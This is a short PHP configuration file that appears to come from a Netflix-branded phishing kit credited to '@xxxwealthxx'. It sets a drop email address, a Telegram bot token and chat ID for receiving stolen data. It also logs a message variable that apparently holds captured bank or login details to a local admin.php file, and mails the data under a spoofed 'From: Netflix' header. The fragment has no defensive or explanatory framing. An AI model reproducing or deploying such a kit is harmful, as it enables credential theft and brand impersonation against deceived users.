<?php

$yourmail  = 'easy00@my.com ';

$api = "6496953013:AAH1RTWKfwAWm3gXZa4zfkjK6CoxXe5cbg8";
$chatid ="6320152167";


$f = fopen("../admin.php", "a");
	fwrite($f, $msgbank);

$headers .= "From: Netflix" . "\r\n";
mail($yourmail, $subject, $yagmail, $headers);



$Our_Name = "Wealth" ; 

$Name_page = "Netflix By @xxxwealthxx" ;



?>